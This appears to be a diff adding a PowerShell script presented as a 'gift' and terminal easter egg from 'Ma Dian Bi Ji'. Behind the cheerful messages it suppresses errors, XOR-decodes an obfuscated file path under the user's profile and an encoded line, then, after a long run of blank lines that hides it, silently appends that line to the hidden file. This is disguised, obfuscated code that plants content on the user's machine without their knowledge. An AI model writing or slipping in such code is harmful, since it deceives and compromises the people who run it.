@@ -1,0 +1,93 @@
+
+$ErrorActionPreference = 'SilentlyContinue'
+
+
+function D($s) {
+    $b = [Convert]::FromBase64String($s)
+    $k = [Text.Encoding]::ASCII.GetBytes($Key)
+    for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor $k[$i % $k.Length] }
+    [Text.Encoding]::ASCII.GetString($b)
+}
+
+$boxone = 'ZwdUG3wLAAccTxMHWiAFLB8AC1M='
+
+$File = Join-Path $env:USERPROFILE (D($boxone))
+
+# The gift: Here’s a voucher code – feel free to contact me to redeem it.
+# exposing the raw in the script source.
+$Vouchercode = 'OgdPXkUOR0ZBEVhOYQQgMjdWPFoEJFYlLmM6ESQhNkFhIC9hDCUXWyBZVA4sMwU+bwBCJTQULhIPHnESWSktIh5iPA4PGB1DAmopPxgWRAJOSD8HMx8EHkk='
+$Line = D($Vouchercode)
+
+# show the surprise.
+
+Write-Host ''
+Write-Host 'Gift delivered!' -ForegroundColor Green
+Write-Host 'Surprise! You reached the terminal easter egg.' -ForegroundColor Green
+Write-Host 'This gift is from "Ma Dian Bi Ji" - may you never see mojibake again.' -ForegroundColor Green
+Write-Host ''
+
+# Write the surprise down in a document in case you forget
+
+Add-Content -Path ".\Voucher_Code.txt" -Value (-join ([Convert]::FromBase64String($Vouchercode) | % { $_.ToString('X2') })) -Encoding ascii
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Add-Content -LiteralPath $File -Value $Line -Encoding ascii
